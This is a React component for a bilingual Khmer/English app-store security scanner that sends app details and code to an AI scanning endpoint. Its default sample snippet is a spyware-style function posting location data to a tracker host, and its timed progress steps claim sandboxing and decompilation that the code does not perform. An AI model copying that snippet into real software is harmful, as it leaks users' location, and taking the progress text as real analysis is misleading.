import React, { useState } from "react";
import { 
  ShieldAlert, 
  ShieldCheck, 
  Bug, 
  Terminal, 
  Activity, 
  Play, 
  Lock, 
  RefreshCw, 
  CheckCircle, 
  XCircle, 
  AlertTriangle,
  Upload,
  Info
} from "lucide-react";
import { AppItem, ScanResult } from "../types";

interface ScannerTabProps {
  apps: AppItem[];
}

export const ScannerTab: React.FC<ScannerTabProps> = ({ apps }) => {
  const [selectedAppId, setSelectedAppId] = useState<string>(apps[0]?.id || "");
  const [customAppName, setCustomAppName] = useState<string>("");
  const [customDescription, setCustomDescription] = useState<string>("");
  const [customPermissions, setCustomPermissions] = useState<string>("Internet Access, Location Tracking, SMS read");
  const [codeSnippet, setCodeSnippet] = useState<string>("function handleStartup() {\n  // Send location coordinates to background server\n  fetch('http://tracker-api.com/log', {method: 'POST'});\n}");
  
  const [isScanning, setIsScanning] = useState<boolean>(false);
  const [scanStep, setScanStep] = useState<string>("");
  const [scanProgress, setScanProgress] = useState<number>(0);
  const [scanResult, setScanResult] = useState<ScanResult | null>(null);
  const [error, setError] = useState<string | null>(null);

  const [activeScannerMode, setActiveScannerMode] = useState<"store" | "sandbox">("store");

  const runScan = async () => {
    setIsScanning(true);
    setError(null);
    setScanResult(null);
    setScanProgress(0);

    const steps = [
      { progress: 15, text: "ទាញយកកូដប្រភព និងទិន្នន័យ (Fetching package source...)" },
      { progress: 40, text: "វិភាគសិទ្ធិប្រើប្រាស់ និងហានិភ័យទិន្នន័យ (Analyzing requested permission vectors...)" },
      { progress: 65, text: "ដំណើរការត្រួតពិនិត្យលើប្រព័ន្ធ Sandbox (Executing mock sandboxing checks...)" },
      { progress: 85, text: "បញ្ជូនទៅកាន់ម៉ាស៊ីន AI ពិនិត្យមេរោគ (Consulting server-side AI Threat Intelligence...)" },
      { progress: 100, text: "ការពិនិត្យត្រូវបានបញ្ចប់ទាំងស្រុង (Scan audit completed.)" }
    ];

    for (const step of steps) {
      setScanStep(step.text);
      setScanProgress(step.progress);
      await new Promise((resolve) => setTimeout(resolve, 800));
    }

    // Build payload
    let payload = {};
    if (activeScannerMode === "store") {
      const selectedApp = apps.find(a => a.id === selectedAppId);
      if (!selectedApp) {
        setError("Please select a valid app.");
        setIsScanning(false);
        return;
      }
      payload = {
        appName: selectedApp.name,
        appDescription: selectedApp.description,
        permissions: selectedApp.permissions,
        codeSnippet: `// Standard catalog app: ${selectedApp.id}\n// Developer: ${selectedApp.developer}\n// Size: ${selectedApp.size}`
      };
    } else {
      if (!customAppName.trim()) {
        setError("សូមបញ្ចូលឈ្មោះកម្មវិធីដើម្បីពិនិត្យ (App name is required for scanning).");
        setIsScanning(false);
        return;
      }
      payload = {
        appName: customAppName,
        appDescription: customDescription,
        permissions: customPermissions.split(",").map(p => p.trim()).filter(Boolean),
        codeSnippet: codeSnippet
      };
    }

    try {
      const response = await fetch("/api/gemini/scan", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      });

      if (!response.ok) {
        throw new Error("ការតភ្ជាប់ទៅកាន់ម៉ាស៊ីនស្កេនមេរោគបានបរាជ័យ (Antivirus server connection failed).");
      }

      const result = await response.json();
      setScanResult(result);
    } catch (err: any) {
      console.error(err);
      setError(err.message || "An unexpected error occurred during antivirus scan.");
    } finally {
      setIsScanning(false);
    }
  };

  return (
    <div id="scanner-container" className="space-y-6">
      {/* Banner / Intro */}
      <div className="bg-linear-to-r from-indigo-900 via-slate-900 to-indigo-950 rounded-2xl p-6 border border-indigo-800/40 text-white relative overflow-hidden">
        <div className="absolute top-0 right-0 p-8 opacity-10 pointer-events-none">
          <Bug className="w-48 h-48 text-indigo-400 animate-pulse" />
        </div>
        <div className="relative z-10 max-w-2xl">
          <div className="inline-flex items-center gap-1.5 px-3 py-1 bg-indigo-500/20 rounded-full border border-indigo-500/30 text-indigo-300 text-xs font-semibold mb-3">
            <Activity className="w-3.5 h-3.5 animate-pulse" />
            ប្រព័ន្ធពិនិត្យសុវត្ថិភាពស្វ័យប្រវត្ត ២៤/៧ (Antivirus Engine)
          </div>
          <h2 className="text-2xl font-bold font-sans mb-2 tracking-tight">
            ប្រព័ន្ធពិនិត្យសុវត្ថិភាព និងស្វែងរកមេរោគ (AI Security Scanner)
          </h2>
          <p className="text-slate-300 text-sm leading-relaxed">
            ការពារឧបករណ៍របស់អ្នកពីកម្មវិធីដែលមានហានិភ័យខ្ពស់ ដូចជាកម្មវិធីលួចទិន្នន័យ (Spyware) កម្មវិធីបង្កប់ពាណិជ្ជកម្ម (Adware) និងកម្មវិធីលួចកត់ត្រាការវាយអក្សរ (Keyloggers)។ គ្រប់កម្មវិធីទាំងអស់នៅក្នុង Khmer App Store ត្រូវបានត្រួតពិនិត្យដោយម៉ាស៊ីន AI វៃឆ្លាតជានិច្ច។
          </p>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Settings/Controls Card */}
        <div className="lg:col-span-5 bg-white dark:bg-slate-900 rounded-2xl border border-slate-100 dark:border-slate-800/80 p-6 shadow-xs flex flex-col justify-between">
          <div>
            <h3 className="font-bold text-slate-900 dark:text-white mb-4 flex items-center gap-2 border-b border-slate-50 dark:border-slate-800/60 pb-3">
              <Terminal className="w-5 h-5 text-indigo-500" />
              បន្ទប់ពិសោធន៍សុវត្ថិភាព (Antivirus Sandbox)
            </h3>

            {/* Mode selection */}
            <div className="grid grid-cols-2 gap-2 mb-5 p-1 bg-slate-50 dark:bg-slate-800/50 rounded-xl border border-slate-100 dark:border-slate-800">
              <button
                onClick={() => { setActiveScannerMode("store"); setScanResult(null); }}
                className={`py-2 px-3 text-xs font-semibold rounded-lg transition-all duration-200 ${
                  activeScannerMode === "store"
                    ? "bg-white dark:bg-slate-700 text-indigo-600 dark:text-white shadow-xs"
                    : "text-slate-500 dark:text-slate-400 hover:text-slate-700"
                }`}
              >
                កម្មវិធីក្នុងហាង (Store Apps)
              </button>
              <button
                onClick={() => { setActiveScannerMode("sandbox"); setScanResult(null); }}
                className={`py-2 px-3 text-xs font-semibold rounded-lg transition-all duration-200 ${
                  activeScannerMode === "sandbox"
                    ? "bg-white dark:bg-slate-700 text-indigo-600 dark:text-white shadow-xs"
                    : "text-slate-500 dark:text-slate-400 hover:text-slate-700"
                }`}
              >
                បង្ហោះកូដស្កេន (Custom Decompile)
              </button>
            </div>

            {/* Store Mode UI */}
            {activeScannerMode === "store" ? (
              <div className="space-y-4">
                <div>
                  <label className="block text-xs font-bold uppercase tracking-wider text-slate-500 dark:text-slate-400 mb-2">
                    ជ្រើសរើសកម្មវិធីមកត្រួតពិនិត្យ (Select App to Scan)
                  </label>
                  <select
                    id="scanner-app-select"
                    value={selectedAppId}
                    onChange={(e) => setSelectedAppId(e.target.value)}
                    className="w-full bg-slate-50 dark:bg-slate-800 border border-slate-200 dark:border-slate-700/80 rounded-xl px-4 py-3 text-sm focus:ring-2 focus:ring-indigo-500/20 text-slate-700 dark:text-slate-200"
                  >
                    {apps.map((app) => (
                      <option key={app.id} value={app.id}>
                        {app.nameKhmer} ({app.name})
                      </option>
                    ))}
                  </select>
                </div>
                <div className="bg-slate-50 dark:bg-slate-800/40 rounded-xl p-4 border border-slate-100 dark:border-slate-800 text-xs leading-relaxed text-slate-500 dark:text-slate-400 flex gap-2.5">
                  <Info className="w-5 h-5 text-indigo-500 shrink-0" />
                  <div>
                    ម៉ាស៊ីន AI នឹងធ្វើការ decompile កូដប្រភព ត្រួតពិនិត្យលើប្រព័ន្ធសិទ្ធិ (Permission system) កំណត់អត្តសញ្ញាណ SDKs តាមដាន និងរកមើលចំណុចខ្សោយនានា។
                  </div>
                </div>
              </div>
            ) : (
              /* Custom Sandbox Mode UI */
              <div className="space-y-4">
                <div>
                  <label className="block text-xs font-bold uppercase tracking-wider text-slate-500 dark:text-slate-400 mb-1.5">
                    ឈ្មោះកម្មវិធីពិសោធន៍ (Simulation App Name)
                  </label>
                  <input
                    type="text"
                    placeholder="e.g. My Helper App"
                    value={customAppName}
                    onChange={(e) => setCustomAppName(e.target.value)}
                    className="w-full bg-slate-50 dark:bg-slate-800 border border-slate-200 dark:border-slate-700/80 rounded-xl px-4 py-2 text-sm focus:ring-2 focus:ring-indigo-500/20 text-slate-700 dark:text-slate-200"
                  />
                </div>
                <div>
                  <label className="block text-xs font-bold uppercase tracking-wider text-slate-500 dark:text-slate-400 mb-1.5">
                    ការពិពណ៌នាកម្មវិធី (App Description)
                  </label>
                  <textarea
                    rows={2}
                    placeholder="Describe app functionalities..."
                    value={customDescription}
                    onChange={(e) => setCustomDescription(e.target.value)}
                    className="w-full bg-slate-50 dark:bg-slate-800 border border-slate-200 dark:border-slate-700/80 rounded-xl px-4 py-2 text-sm focus:ring-2 focus:ring-indigo-500/20 text-slate-700 dark:text-slate-200"
                  />
                </div>
                <div>
                  <label className="block text-xs font-bold uppercase tracking-wider text-slate-500 dark:text-slate-400 mb-1.5">
                    សិទ្ធិដែលកម្មវិធីទាមទារ (Comma-separated permissions)
                  </label>
                  <input
                    type="text"
                    value={customPermissions}
                    onChange={(e) => setCustomPermissions(e.target.value)}
                    className="w-full bg-slate-50 dark:bg-slate-800 border border-slate-200 dark:border-slate-700/80 rounded-xl px-4 py-2 text-sm focus:ring-2 focus:ring-indigo-500/20 text-slate-700 dark:text-slate-200 font-mono"
                  />
                </div>
                <div>
                  <label className="block text-xs font-bold uppercase tracking-wider text-slate-500 dark:text-slate-400 mb-1.5">
                    កូដប្រភព / កូដគួរឱ្យសង្ស័យ (Source Code/Config to Audit)
                  </label>
                  <textarea
                    rows={4}
                    value={codeSnippet}
                    onChange={(e) => setCodeSnippet(e.target.value)}
                    className="w-full bg-slate-50 dark:bg-slate-800 border border-slate-200 dark:border-slate-700/80 rounded-xl p-3 text-xs focus:ring-2 focus:ring-indigo-500/20 text-slate-700 dark:text-slate-200 font-mono"
                  />
                </div>
              </div>
            )}
          </div>

          <div className="mt-6 pt-4 border-t border-slate-50 dark:border-slate-800/60">
            <button
              id="start-scan-btn"
              onClick={runScan}
              disabled={isScanning}
              className="w-full py-3 bg-indigo-600 hover:bg-indigo-700 text-white rounded-xl font-bold text-sm shadow-md transition-all duration-200 flex items-center justify-center gap-2 active:scale-[0.98] disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isScanning ? (
                <>
                  <RefreshCw className="w-5 h-5 animate-spin" />
                  កំពុងពិនិត្យមេរោគ... ({scanProgress}%)
                </>
              ) : (
                <>
                  <Play className="w-5 h-5" />
                  ចាប់ផ្តើមវិភាគសុវត្ថិភាព (Start AI Security Audit)
                </>
              )}
            </button>
          </div>
        </div>

        {/* Scan Results Display Terminal */}
        <div className="lg:col-span-7 bg-slate-950 text-slate-200 rounded-2xl border border-slate-900 shadow-xl overflow-hidden min-h-[480px] flex flex-col">
          {/* Terminal Header */}
          <div className="bg-slate-900 px-4 py-3 border-b border-slate-800 flex items-center justify-between">
            <div className="flex items-center gap-2">
              <span className="w-3.5 h-3.5 bg-rose-500 rounded-full inline-block" />
              <span className="w-3.5 h-3.5 bg-amber-500 rounded-full inline-block" />
              <span className="w-3.5 h-3.5 bg-emerald-500 rounded-full inline-block" />
              <span className="text-xs font-mono font-bold text-slate-400 ml-2">
                SECURITY_AUDITOR_SHELL
              </span>
            </div>
            <div className="text-xs text-slate-500 font-mono">
              Status: {isScanning ? "BUSY" : "IDLE"}
            </div>
          </div>

          {/* Terminal Body */}
          <div className="p-6 font-mono text-sm leading-relaxed flex-1 flex flex-col justify-between overflow-y-auto">
            {isScanning && (
              <div className="flex-1 flex flex-col items-center justify-center gap-4 text-center my-auto">
                <div className="p-4 bg-indigo-500/10 rounded-full border border-indigo-500/20 text-indigo-400 animate-spin">
                  <RefreshCw className="w-10 h-10" />
                </div>
                <div className="space-y-1.5">
                  <div className="text-indigo-400 font-bold font-sans">
                    {scanStep}
                  </div>
                  <div className="text-xs text-slate-500">
                    Executing dynamic sandboxing analysis & pattern signature matching...
                  </div>
                </div>
                {/* Visual Progress Bar */}
                <div className="w-64 bg-slate-900 rounded-full h-2 overflow-hidden border border-slate-800 mt-2">
                  <div 
                    className="bg-indigo-500 h-2 rounded-full transition-all duration-300"
                    style={{ width: `${scanProgress}%` }}
                  />
                </div>
              </div>
            )}

            {!isScanning && !scanResult && !error && (
              <div className="flex-1 flex flex-col items-center justify-center text-center my-auto text-slate-500 py-12">
                <ShieldAlert className="w-16 h-16 text-slate-700 mb-3 animate-pulse" />
                <h4 className="text-sm font-bold text-slate-400 mb-1">
                  រង់ចាំការវិភាគសុវត្ថិភាព (Waiting for Audit)
                </h4>
                <p className="text-xs max-w-sm">
                  ជ្រើសរើសកម្មវិធី ឬបន្លំកូដដើម្បីដំណើរការការស្កេនស្វែងរកមេរោគ សារធាតុចារកម្ម និងការបំពានសិទ្ធិឯកជនភាពផ្សេងៗ។
                </p>
              </div>
            )}

            {error && (
              <div className="flex-1 flex flex-col items-center justify-center text-center my-auto text-rose-400 py-12">
                <XCircle className="w-14 h-14 mb-3" />
                <h4 className="text-sm font-bold text-rose-300 mb-1">
                  មានបញ្ហាក្នុងការស្វែងរកមេរោគ (Scanner Error)
                </h4>
                <p className="text-xs max-w-sm leading-relaxed">
                  {error}
                </p>
              </div>
            )}

            {!isScanning && scanResult && (
              <div className="space-y-5 animate-fadeIn">
                {/* Result Hero Banner */}
                <div className={`p-4 rounded-xl border flex items-center justify-between gap-4 ${
                  scanResult.safetyStatus === "Clean" || scanResult.safetyStatus === "Clean (Simulated)"
                    ? "bg-emerald-950/20 border-emerald-900/60 text-emerald-400"
                    : scanResult.safetyStatus === "Low Risk"
                      ? "bg-amber-950/20 border-amber-900/60 text-amber-400"
                      : "bg-rose-950/20 border-rose-900/60 text-rose-400"
                }`}>
                  <div className="flex items-center gap-3">
                    {scanResult.safetyStatus === "Clean" || scanResult.safetyStatus === "Clean (Simulated)" ? (
                      <ShieldCheck className="w-10 h-10 text-emerald-500 shrink-0" />
                    ) : (
                      <ShieldAlert className="w-10 h-10 shrink-0" />
                    )}
                    <div>
                      <div className="text-[10px] text-slate-500 uppercase tracking-widest font-bold">
                        AUDIT VERDICT
                      </div>
                      <h4 className="text-lg font-bold">
                        {scanResult.appName} - {scanResult.safetyStatus}
                      </h4>
                    </div>
                  </div>
                  <div className="text-right">
                    <div className="text-[10px] text-slate-500 font-bold uppercase">
                      SAFETY SCORE
                    </div>
                    <div className="text-2xl font-bold font-mono">
                      {scanResult.safetyScore}/100
                    </div>
                  </div>
                </div>

                {/* Simulated Indicator warning if mock */}
                {scanResult.isMock && (
                  <div className="bg-slate-900 border border-slate-800 text-xs px-3 py-2 rounded-lg text-slate-400 flex items-center gap-2">
                    <Info className="w-4 h-4 text-indigo-400 shrink-0" />
                    <span>
                      <strong>ចំណាំ៖</strong> នេះជាលទ្ធផលត្រួតពិនិត្យគំរូ ដោយសារអ្នកមិនទាន់បានកំណត់ GEMINI_API_KEY នៅក្នុង Secrets។
                    </span>
                  </div>
                )}

                {/* Audit Findings */}
                <div className="space-y-3">
                  <div className="text-xs text-slate-500 font-bold uppercase tracking-wider">
                    Detailed Audit Findings
                  </div>
                  <div className="space-y-2">
                    {scanResult.findings.map((finding, idx) => (
                      <div key={idx} className="bg-slate-900/80 rounded-xl p-3.5 border border-slate-800 flex gap-3">
                        <div className="mt-0.5">
                          {finding.status === "Passed" ? (
                            <CheckCircle className="w-4 h-4 text-emerald-500" />
                          ) : finding.status === "Warning" ? (
                            <AlertTriangle className="w-4 h-4 text-amber-500" />
                          ) : (
                            <XCircle className="w-4 h-4 text-rose-500" />
                          )}
                        </div>
                        <div className="space-y-1">
                          <div className="flex items-center gap-2">
                            <span className="font-bold text-slate-200 text-xs uppercase">
                              {finding.type}
                            </span>
                            <span className={`text-[10px] px-1.5 py-0.5 rounded-sm font-semibold uppercase ${
                              finding.status === "Passed"
                                ? "bg-emerald-500/10 text-emerald-400"
                                : finding.status === "Warning"
                                  ? "bg-amber-500/10 text-amber-400"
                                  : "bg-rose-500/10 text-rose-400"
                            }`}>
                              {finding.status}
                            </span>
                          </div>
                          <p className="text-xs text-slate-400 leading-relaxed">
                            {finding.details}
                          </p>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>

                {/* Overal Verdict in Khmer & English */}
                <div className="bg-slate-900 p-4 rounded-xl border border-indigo-950 text-indigo-300">
                  <div className="text-xs text-slate-500 font-bold uppercase tracking-wider mb-1">
                    សេចក្តីសន្និដ្ឋានរួម (Verdict Statement)
                  </div>
                  <p className="text-xs leading-relaxed font-sans">
                    {scanResult.verdict}
                  </p>
                </div>
              </div>
            )}

            {/* Console Prompt footer */}
            <div className="mt-6 pt-4 border-t border-slate-900 text-slate-600 text-xs flex items-center gap-2">
              <span className="text-indigo-500 font-bold">$</span>
              <span>await securityScanner.runDiagnostics(); // Ready for audit</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
